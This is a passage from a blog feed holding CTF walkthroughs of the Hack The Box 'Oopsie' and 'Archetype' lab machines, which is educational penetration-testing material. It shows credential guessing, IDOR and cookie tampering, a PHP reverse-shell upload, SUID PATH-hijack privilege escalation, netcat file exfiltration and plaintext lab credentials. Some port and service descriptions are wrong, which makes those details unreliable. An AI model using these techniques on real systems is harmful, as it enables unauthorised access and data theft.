SSH version. I got it from <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos" rel="noopener noreferrer">IppSec&apos;s </a>walkthroughs. Thanks <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos" rel="noopener noreferrer">IppSec </a>for your valuable walkthroughs &#x1F64F;. Here is the trick. If you see the SSH version like <strong><code>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</code> </strong>just copy it and search through google. In the search results you can find domain called <code>launchpad.net</code>. It contains some important details like Ubuntu Releases, last update, publishing details and more important is <strong>builds</strong>. Likewise, in this case it is</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-26.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1894" height="789" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-26.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-26.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-26.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-26.png 1894w" sizes="(min-width: 720px) 720px"></figure><p>Now we know the operating system is Ubuntu and we have open ports 22 (SSH) and 80 (HTTP). Let&apos;s go to the port 80 first.</p><h3 id="013-discover-more-on-port-80"><strong>01.3 Discover more on port 80</strong></h3><p>Open web browser and <code>Burp Suite</code>. Type http://10.10.10.28/</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-27.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="458" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-27.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-27.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Here we got a nice landing page. First thing first; <code>view source code</code> and look if we have any interesting things. Unfortunately, nothing interesting found. Then we can see the traffic on burp.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-28.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="713" height="258" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-28.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-28.png 713w"></figure><p>In here, you can find some endpoint, so let&apos;s jump into it.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-29.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="609" height="211" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-29.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-29.png 609w"></figure><p>But I got nothing, it&apos;s just a blank page. Hmm, what about &quot;<a href="http://10.10.10.28/cdn-cgi/login/" rel="noopener noreferrer">http://10.10.10.28/cdn-cgi/login/</a>&quot; ah, let&apos;s check...</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-30.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="455" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-30.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-30.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>It contains a login page. lets check basic default username password like,</p><ul><li>admin : admin</li><li>admin : admin123</li><li>admin : password</li><li>admin : pa$$w0rd</li></ul><p>Nothing worked.&#x1F622; Oh wait, wait.. Do you remember we got some password at the end of Archetype machine? Try to remember, it was <strong><code>MEGACORP_4dm1n!!</code></strong>. Let&apos;s check this one as well.</p><p><code>admin : MEGACORP_4dm1n!!</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-31.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="454" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-31.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-31.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We got the dashboard. and now it&apos;s time to check page source.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-32.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="950" height="153" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-32.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-32.png 950w" sizes="(min-width: 720px) 720px"></figure><p>Here &#x1F446; we have some interesting links. let&apos;s check one-by-one.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-33.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="257" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-33.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-33.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>In upload section they say &quot;if you need to upload anything, please be a <strong>superadmin </strong>!&quot;. hmm ok let&apos;s check other ones.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-34.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="267" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-34.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-34.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Oh!, now I smell some <code>IDOR vulnerability</code>. Isn&apos;t it ?? Let&apos;s check ..</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-35.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1914" height="549" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-35.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-35.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-35.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-35.png 1914w" sizes="(min-width: 720px) 720px"></figure><p>I send this request to <code>burp intruder</code> and change settings like below &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-36.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1177" height="344" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-36.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-36.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-36.png 1177w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-37.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="843" height="411" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-37.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-37.png 843w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s start the <strong>attack</strong>.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-38.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1174" height="789" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-38.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-38.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-38.png 1174w" sizes="(min-width: 720px) 720px"></figure><p>Above I sorted the output result by the length, There are more users and now I got a super admin Access ID and Email. So let&apos;s jump back to the upload section again. But now we <code>intercept</code> the web traffic through <code>Burp Proxy</code>.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-39.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1881" height="469" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-39.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-39.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-39.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-39.png 1881w" sizes="(min-width: 720px) 720px"></figure><p>When you refresh the page you can see the cookie contain something like user id and role. so let&apos;s alter those values by super admin and then click forward the traffic.</p><blockquote><em>I was done this using match and replace method on burp. it will be more quick rather than intercept request one by one</em></blockquote><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-40.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1219" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-40.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-40.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-40.png 1219w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-foothold"><strong>02. Foothold</strong></h2><p>Let&apos;s bump to the upload page, and now it accessible.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-41.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1161" height="534" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-41.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-41.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-41.png 1161w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s check whether we can upload <code>PHP web shell</code> or what kind of file type are they need to be uploaded. First copy the PHP Reverse shell to our current directory.</p><pre><code class="language-bash">cp /usr/share/webshells/php/php-reverse-shell.php .</code></pre><p>Then we can open that <code>php-reverse-shell.php</code> whatever text editor you like and edit the below changes. &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-42.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="484" height="118"></figure><p>And I rename that file to <code>hiddenwiki.php</code>. Let&apos;s upload the file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-43.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="277" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-43.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-43.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>File has been uploaded, Now we need to find where the file is.</p><p>We have lots of fuzzing tools, but I personally love <a href="https://twitter.com/_maurosoria" rel="noopener noreferrer">Mauro Soria&apos;s</a> <a href="https://github.com/maurosoria/dirsearch" rel="noopener noreferrer">Dirsearch </a>tool. it has amazing fast output and also can customize the script because it was written using python3. For the wordlist I used <a href="https://danielmiessler.com/" rel="noopener noreferrer">Daniel Miessler&apos;s</a> <a href="https://github.com/danielmiessler/SecLists" rel="noopener noreferrer">SecLists</a>.</p><p>Now power up the <code>dirsearch</code>tool and wait for the results.</p><pre><code class="language-bash">dirsearch.py -u http://10.10.10.28/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
</code></pre><p>From the beginning of the results we got directory called <code>uploads</code>.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-44.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="516" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-44.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-44.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now it&apos;s time to powerup netcat listener and we can use curl command to fetch the uploaded file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-45.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="232" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-45.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-45.png 1000w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-46.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="206" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-46.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-46.png 1000w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-47.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1442" height="386" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-47.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-47.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-47.png 1442w" sizes="(min-width: 720px) 720px"></figure><p>We land a shell as <code>www-data</code> and proceed to upgrade it. Type below command to spawn our shell &#x1F447;</p><pre><code class="language-bash">python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-48.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="355" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-48.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-48.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>First check web user directory where it has some interesting information.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-49.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="152" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-49.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-49.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Here we found <code>db.php</code> file in <code>/var/www/html/cdn-cgi/</code>login directory. let&apos;s view the file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-50.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="233" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-50.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-50.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Oh! here we found new user credentials.</p><ul><li>robert:M3g4C0rpUs3r!</li></ul><p>So let&#x2019;s access Robert&#x2019;s user, providing the password found. <code>su robert</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-51.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="233" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-51.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-51.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Yes it works and now we are in <code>robert</code> user. we can view our user flag now. Let&apos;s check and submit it to HTB</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-52.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="191" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-52.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-52.png 1000w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-53.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="545" height="269"></figure><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>Now we are on the last step. We need to find root flag.</p><p>Now we are robert. So again, look around the file system, First we can use <code>id</code>command to verify in which user group we are now. Let&apos;s check it.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-54.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="191" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-54.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-54.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>As above result; we see that this robert is part of a <code>bugtrack</code>group. Now let&apos;s check for what files this group has the access.</p><pre><code class="language-bash">find / -type f -group bugtracker 2&gt; /dev/null</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-55.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="191" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-55.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-55.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>There is a binary file called <code>bugtracker</code> and also we notice that it has SUID permissions.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-56.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="191" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-56.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-56.png 1000w" sizes="(min-width: 720px) 720px"></figure><pre><code class="language-bash">The &#x2018;s&#x2019; in the user &#x2018;execute&#x2019; field, it runs &#x2018;as&#x2019; its creator, in this case, root. &#x1F60B;&#x1F60B;&#x1F60E;</code></pre><p>Let&apos;s run the file and check what are the mess around that file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-57.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1000" height="447" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-57.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-57.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Nothing interesting found. let&apos;s check <code>strings</code>command to analyze the binary file for any hard-coded information.</p><pre><code class="language-bash">strings /usr/bin/bugtracker</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-58.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="464" height="277"></figure><p>When looking around the output, you can see that it looks like a system command which is calling the <code>cat</code>command using the <code>relative path</code> instead of the <code>absolute path</code>. So what&apos;s on your mind now. yes we can create malicious file called cat and modifying the path to include the current working directory. Using that method we can abuse this misconfiguration and escalate our privileges to root.&#x1F60E;&#x1F60E;</p><p>Let&apos;s create the file, make it as executable and add the current working directory to PATH.</p><pre><code class="language-bash">cd /tmp/
echo &apos;/bin/sh&apos; &gt; cat
chmod +x cat
export PATH=/tmp:$PATH</code></pre><p>Now let&apos;s run the<code>/usr/bin/bugtracker</code> binary again.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-59.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="699" height="443" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-59.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-59.png 699w"></figure><p>Now we are landing as root. The last step; let&apos;s check the root flag and submit it to the HTB.</p><blockquote><em>Here I was unable to view the root.txt flag using cat,vi,nano commands. so instead of view the flag, I&apos;m going to use netcat and get that file to my host.</em></blockquote><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-62.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="204" height="248"></figure><p>-- On the receiving end (My host)</p><pre><code class="language-bash">nc -l -p 7878 &gt; root.txt</code></pre><p>-- On the sending end (Oopsie machine)</p><pre><code class="language-bash">nc -w 3 destination-ip 7878 &lt; root.txt</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-60.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="717" height="396" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-60.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-60.png 717w"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-61.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="858" height="636" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-61.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-61.png 858w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="04-post-exploitation"><strong>04. Post Exploitation</strong></h2><p>Inside root&apos;s folder, we see a <code>.config</code>folder, which contains a <code>FileZilla</code> config file with the credentials <code>ftpuser : mc@F1l3ZilL4</code> visible in plain text.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-80.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1742" height="642" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-80.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-80.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-80.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-80.png 1742w" sizes="(min-width: 720px) 720px"></figure><p>That&#x2019;s all for now! We&#x2019;ll keep in mind that some of the info collected (like credentials, folders&#x2026;) can be useful in the next 7 labs of the &#x2018;Starting Point&#x2019; path. </p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-63.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="671" height="310" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-63.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-63.png 671w"></figure><p>Thanks for reading and Happy Hacking! </p><p>I&#x2019;ll see you on the next box! <strong><a href="https://h4rithd.com/blog/vaccine-walkthrough/index.html">Vaccine</a> </strong>&#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Archetype Walkthrough]]></title><description><![CDATA[Here I will begin with the path of "Starting Point". Basically its a series of 9 machines rated as "Very Easy" and should be rooted in a sequence.]]></description><link>https://h4rithd.com/blog/starting-point-htb-archetype-walkthrough/</link><guid isPermaLink="false">60b6538aa8ce8209ffb55b6e</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Harith Dilshan]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Archetype Walkthrough]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Sun, 25 Apr 2021 15:34:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/ArchetypeBG.jpg" medium="image"/><content:encoded><![CDATA[<hr><img src="https://h4rithd.com/blog/content/images/2021/06/ArchetypeBG.jpg" alt="Archetype Walkthrough"><p>Here I will begin with the path of &quot;<strong>Starting Point</strong>&quot;. Basically it&#x2019;s a series of 9 machines rated as &quot;<strong>Very Easy&quot; </strong>and should be rooted in a sequence.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="999" height="759" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image.png 600w, https://h4rithd.com/blog/content/images/2021/06/image.png 999w" sizes="(min-width: 720px) 720px"></figure><p>They will provide official walkthroughs for each of 9 machines. As I think it will be very helpful for noob to understand the platform, techniques and more about HTB. And when it comes to noob, no one is here to find <code>zero-day</code> vulnerabilities. So from my perspective, it&apos;s fine to read each and every walkthroughs provided by HTB and others to understand by yourself. <em><em>&quot;Walkthroughs are the teachers&quot;.</em></em></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-1.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1202" height="328" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-1.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-1.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-1.png 1202w" sizes="(min-width: 720px) 720px"></figure><p>Enough talks &#x1F971;, let&apos;s start to hack. &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><em><strong>Disclaimers:</strong> No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, Just click on &quot;<strong>Join Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-2.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="460" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-2.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-2.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. <strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-3.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="424" height="442"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-4.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1526" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-4.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-4.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-4.png 1526w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=127</code>. There is one route between machine and us (VPN) so it&apos;s definitely it will be <code>Windows</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="011-fast-ports-scan"><strong>01.1 Fast ports scan</strong></h3><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27</code></pre><pre><code class="language-bash">-n	: Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable netwok</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-5.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1526" height="1030" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-5.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-5.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-5.png 1526w" sizes="(min-width: 720px) 720px"></figure><p>Here we can see some &#xA0;<strong>* (Interesting)</strong> ports. others can be avoid.</p><hr><h3 id="012-run-nmap-scripting-engine"><strong>01.2 Run Nmap Scripting Engine</strong></h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all open ports so that we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27</code></pre><pre><code class="language-bash">-sV	: Service fingerprinting
-sC	: Launch default NSE nmap scripts</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-6.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="862" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-6.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-6.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now we know the OS is Windows (Microsoft SQL Server 2017 RTM) and it has SMB (1433) port open. And lets enumerate further. Remember enumerating is the<strong> key!</strong> &#x1F511;</p><h3 id="013-list-all-available-shares">01.3 List all available shares</h3><p>So here it has <code>smb</code> (1433) port open. I used <code>smbclient</code> to list out all the available shares as <code>anonymous</code> user.</p><pre><code class="language-bash">sudo smbclient -N -L 10.10.10.27</code></pre><pre><code class="language-bash">-N	: Don&apos;t ask for a password
-L	: Get a list of shares available on a host</code></pre><p>Here is output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-7.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1340" height="588" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-7.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-7.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-7.png 1340w" sizes="(min-width: 720px) 720px"></figure><p>Here we got something very interesting right? There is only single share &#x2018;<strong>backups</strong>&#x2019; accessible with no passwords. so let&apos;s try to access it and see what&apos;s inside.&#x1F60E;&#x1F60B;</p><pre><code class="language-bash">smbclient -N \\\\10.10.10.27\\backups\\</code></pre><p>So now we are done with <code>SMB</code> shell and there is a file called <code>prod.dtsConfig</code>. so let&apos;s download it.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-8.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="308" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-8.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-8.png 1000w" sizes="(min-width: 720px) 720px"></figure><pre><code class="language-bash">smb: \&gt; dir	: List all directories
smb: \&gt; get	&lt;file-name&gt; : Download file</code></pre><p>Now we can open <code>prod.dtsConfig</code> file and yeah that &#x2018;<strong>prod.dtsConfig</strong>&#x2019; file contains a <code>SQL connection string</code>, containing credentials for the local Windows user <strong>ARCHETYPE\sql_svc</strong> &#x1F942;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-9.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="273" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-9.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-9.png 1000w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-lets-get-foothold-%E2%80%A6"><strong>02. Lets get Foothold &#x2026;</strong></h2><p>Now we have credentials, &#xA0;Let&apos;s try connecting to the SQL Server using <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py" rel="noopener noreferrer">Impacket&apos;s 